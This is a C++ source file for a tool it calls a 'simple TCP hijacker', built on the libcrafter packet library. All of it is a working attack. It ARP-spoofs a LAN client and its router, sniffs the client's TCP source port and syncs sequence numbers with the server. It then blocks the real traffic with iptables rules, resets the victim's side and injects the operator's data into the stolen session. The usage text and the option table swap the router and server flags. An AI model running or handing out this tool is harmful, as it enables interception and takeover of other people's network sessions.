/*
 * main.cpp
 *
 *  Created on: Apr 6, 2011
 *      Author: larry
 */
#include <iostream>
#include <string>
#include <cstdlib>
#include <cstring>
#include <getopt.h>
#include <crafter.h>

using namespace std;
using namespace Crafter;

/* Some constant */
const int noargument = 0;
const int requiredargument = 1;

static void print_usage (ostream& stream, const string& program_name, int exit_code) {
	stream << "Usage: " << program_name << " -i <interface> -l <listen port> -c <client ip> -r <router> -s <server ip> -p <server port>" << endl;
	stream << "  -i  --interface    Interface, like wlan0 or eth0" << endl;
	stream << "  -l  --listen       Port where netjacker is waiting for a connection, default is 8900" << endl;
	stream << "  -c  --client       The client IP address (should be a private LAN IP)" << endl;
	stream << "  -r  --router       Router IP address, should be a private" << endl;
	stream << "  -s  --server       The server IP address, could be any IP address (public or private)" << endl;
	stream << "  -p  --port         The port that the client is connecting to " << endl;
	exit (exit_code);
}

/*
 * This function add iptables rules to block the traffic between the victim and the server
 * of the connection we want to hijack
 */
void start_block(const string& dst_ip, const string& src_ip, int dst_port, int src_port);

void clear_block(const string& dst_ip, const string& src_ip, int dst_port, int src_port);

/* Put and clear IP forwarding */
void clear_forward();
void ip_forward();

/* Source port that we have to find out */
short_word srcport = 0;

void PacketHandler(Packet* sniff_packet, void* user) {

	/* Get the TCP layer from the packet */
	TCP* tcp_header = GetTCP(*sniff_packet);

	srcport = tcp_header->GetSrcPort();
}

/* Global remote socket descriptor */
int remote_sock;

void RecvHandler(Payload& payload, void* user) {

	int sendcount;

	/* Send the data back to the client */
	if((sendcount = send(remote_sock, payload.GetRawPointer(), payload.GetSize(), 0))== -1) {
		string message = "[@] Error sending data to client ";
		perror(message.c_str());
		close(remote_sock);
	}

}

int main(int argc, char* argv[]) {
	/* Interface */
	string iface; byte iface_flag = 0;
	/* Listening port */
	short_word listen_port = 8900;
	/* Client and server IP address */
	string client_ip; byte client_flag = 0;
	string server_ip; byte server_flag = 0;
	/* Internal router IP address */
	string router_ip; byte router_flag = 0;
	/* Server port */
	short_word server_port; byte server_port_flag = 0;
	/* Error flag */
	byte error = 0;

    /* Get the program name */
    string program_name = string(argv[0]);

    /* Option parsing */
    while (1) {

		static struct option long_options[] =
		  {
			{"interface", requiredargument, 0, 'i'},
			{"listen",    requiredargument, 0, 'l'},
			{"client",    requiredargument, 0, 'c'},
			{"router",    requiredargument, 0, 's'},
			{"server",    requiredargument, 0, 'r'},
			{"port",      requiredargument, 0, 'p'},
			{0, 0, 0, 0}
		  };

		/* Getopt_long stores the option index here. */
		int option_index = 0;

		int c = getopt_long (argc, argv, "i:l:c:s:r:p:",
							 long_options, &option_index);

		/* Detect the end of the options. */
		if (c == -1)
		  break;

		switch (c) {

		  case 'i':
			iface = string(optarg);
			iface_flag = 1;
			break;

		  case 'l':
			listen_port = atoi(optarg);
			break;

		  case 'c':
			client_ip = string(optarg);
			client_flag = 1;
			break;

		  case 's':
			server_ip = string(optarg);
			server_flag = 1;
			break;

		  case 'r':
			router_ip = string(optarg);
			router_flag = 1;
			break;

		  case 'p':
			server_port = atoi(optarg);
			server_port_flag = 1;
			break;

		  default:
			print_usage(cerr,program_name,1);
			break;

		  }
    }

    if(!iface_flag) {
    	cerr << "[@] Interface is missing. " << endl;
    	error = 1;
    }

    if(!listen_port) {
    	cerr << "[@] You should specify a port to listen. " << endl;
    	error = 1;
    }

    if(!client_flag) {
    	cerr << "[@] Client IP is missing " << endl;
    	error = 1;
    }

    if(!router_flag) {
    	cerr << "[+] WARNING: You didn't put a router IP address. If the server is not in your LAN this probably won't work. " << endl;
    	router_ip = server_ip;
    }

    if(!server_flag) {
    	cerr << "[@] Server IP is missing " << endl;
    	error = 1;
    }

    if(!server_port_flag) {
    	cerr << "[@] Server port is missing " << endl;
    	error = 1;
    }

    if(error)
		print_usage(cerr,program_name,1);

    InitCrafter();

    /* Print some general information */
    cout << "[%] SIMPLE TCP HIJACKER" << endl;
    cout << "[%] Listening on port : " << listen_port << endl;

    /* Local listening socket */
    int local_sock = socket(AF_INET, SOCK_STREAM, 0);

    if(local_sock == -1){
    	perror("[@] Error initializing server socket ");
    	exit(1);
    }

    /* Generic integer */
    int *p_int = new int;
    *p_int = 1;

    /* Set sockets options */
    if( (setsockopt(local_sock, SOL_SOCKET, SO_REUSEADDR, p_int, sizeof(int)) == -1 )||
        (setsockopt(local_sock, SOL_SOCKET, SO_KEEPALIVE, p_int, sizeof(int)) == -1 ) ){
    	perror("[@] Error setting server socket options ");
        delete p_int;
    	exit(1);
    }

    delete p_int;

    /* Local Address structure */
    sockaddr_in my_addr;

    my_addr.sin_family = AF_INET;                           /* Set socket family */
    my_addr.sin_port = htons(listen_port);                  /* Set port */
    my_addr.sin_addr.s_addr = INADDR_ANY ;                  /* Set local IP address */
    memset(my_addr.sin_zero, 0, sizeof(my_addr.sin_zero));  /* Fill with zeros */

    /* Bind socket */
    if(bind(local_sock, (sockaddr*)&my_addr, sizeof(my_addr)) == -1 ){
    	perror("[@] Error binding socket ");
    	exit(1);
    }

    /* Listen */
    if(listen(local_sock, 10) == -1 ){
    	perror("[@] Error listening socket ");
    	exit(1);
    }

    socklen_t addr_size = sizeof(sockaddr_in);

    /* Remote Address structure */
    sockaddr_in remote_addr;

    if(( remote_sock = accept(local_sock, (sockaddr*)&remote_addr, &addr_size))!= -1 ) {
    	/* Get IP address of the host connected */
    	string remote_ip_address(inet_ntoa(remote_addr.sin_addr));
    	/* Get the port of the remote host */
    	unsigned short int remote_port = ntohs(remote_addr.sin_port);
    	/* Get IP address of the local host */
    	string local_ip_address(inet_ntoa(my_addr.sin_addr));

    	/* Print some information */
    	cout << "[#] Received connection from: " << remote_ip_address << ":" << remote_port << endl;
    	cout << "[#] Initializing the hijacking process... " << endl;

    	ip_forward();

    	/* Begin the spoofing */
    	ARPContext* arp_context = ARPSpoofingReply(router_ip,client_ip,iface);

    	/* Print some info */
    	PrintARPContext(*arp_context);

    	/* --------- Find out the source port... */

    	/* IP stuff */
    	string filter = "tcp and host "+ server_ip +" and host " + client_ip;
    	/* TCP stuff */
    	filter += " and dst port " + StrPort(server_port);
    	/* Launch the sniffer */
    	Sniffer sniff(filter,iface,PacketHandler);
    	sniff.Capture(1);

    	cout << "[@] Detected a source port: " << srcport << endl;

    	/* TCP connection victim to server */
    	TCPConnection tcp_v_to_s(client_ip,server_ip,srcport,server_port,iface,TCPConnection::ESTABLISHED);
    	/* TCP connection server to victim */
    	TCPConnection tcp_s_to_v(server_ip,client_ip,server_port,srcport,iface,TCPConnection::ESTABLISHED);
    	/* Both connection are already established... */

    	/* [+] Synchronize the ACK and SEQ numbers
    	 * This will block the program until some TCP packets from the spoofed connection
    	 * pass through your computer...
    	 */
    	tcp_v_to_s.Sync();
    	tcp_v_to_s.SetReadHandler(RecvHandler,0);
    	tcp_s_to_v.Sync();

    	/* Give all this a second... */
    	sleep(1);

    	cout << "[@] Connections synchronized. Hijack READY." << endl;

    	/* Start blocking the traffic of the spoofed connection */
    	start_block(server_ip,client_ip,server_port,srcport);

    	/* Reset the connection to the victim */
    	tcp_s_to_v.Reset();

        /* Buffer for receiving data */
        const int buffer_len = 65536;
        char* buffer = new char[buffer_len];

        /* Set the buffer to zero */
        memset(buffer, 0, buffer_len);

        /* Count of bytes received */
        int bytecount;

        while(1) {

    		/* Set the buffer to zero */
    		memset(buffer, 0, buffer_len);

    		/* Receive data */
    		bytecount = recv(remote_sock, buffer, buffer_len, 0);
    		if(bytecount == -1){
    			string message = "[@] Error receiving data from host " + remote_ip_address + ":" + StrPort(remote_port);
    			perror(message.c_str());
    			delete [] buffer;
    			close(remote_sock);
    			return 0;
    		} else if( bytecount == 0) {
    			cout << "[@] Connection closed from " + remote_ip_address << ":" << remote_port << endl;
    			delete [] buffer;
    			close(remote_sock);
    			break;;
    		}

    		/* Data received */
    		string data_rcv = string(buffer);

    		tcp_v_to_s.Send(data_rcv.c_str());

        }

    	/* Close the spoofed connection with the server after we send our commands */
    	tcp_v_to_s.Close();

    	/* Clear everything */
    	clear_block(server_ip,client_ip,server_port,srcport);
        clear_forward();

    	CleanARPContext(arp_context);

    } else
        perror("[@] Error accepting connection ");

	CleanCrafter();

	return 0;
}

void ip_forward() {
    system("/bin/echo 1 > /proc/sys/net/ipv4/ip_forward");
    system("/bin/echo 0 > /proc/sys/net/ipv4/conf/eth0/send_redirects");
    system("iptables --append FORWARD --in-interface eth0 --jump ACCEPT");
}

void start_block(const string& dst_ip, const string& src_ip, int dst_port, int src_port) {

	/* Delete the forwarding... */
	system("iptables --delete FORWARD --in-interface eth0 --jump ACCEPT");

	/* Drop packets received from the spoofed connection */
	system(string("/sbin/iptables -A FORWARD -s " + dst_ip + " -d " + src_ip +
			      " -p tcp --sport " + StrPort(dst_port) + " --dport " + StrPort(src_port) +
			      " -j DROP").c_str());

	system(string("/sbin/iptables -A FORWARD -s " + src_ip + " -d " + dst_ip +
			      " -p tcp --sport " + StrPort(src_port) + " --dport " + StrPort(dst_port) +
			      " -j DROP").c_str());

	/* Append again the forwarding, so the victim can establish a new connection... */
	system("iptables --append FORWARD --in-interface eth0 --jump ACCEPT");

}

void clear_block(const string& dst_ip, const string& src_ip, int dst_port, int src_port) {
    system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");

	system(string("/sbin/iptables -D FORWARD -s " + dst_ip + " -d " + src_ip +
			      " -p tcp --sport " + StrPort(dst_port) + " --dport " + StrPort(src_port) +
			      " -j DROP").c_str());

	system(string("/sbin/iptables -D FORWARD -s " + src_ip + " -d " + dst_ip +
			      " -p tcp --sport " + StrPort(src_port) + " --dport " + StrPort(dst_port) +
			      " -j DROP").c_str());
}

void clear_forward() {
    system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");
    system("iptables --delete FORWARD --in-interface eth0 --jump ACCEPT");
}
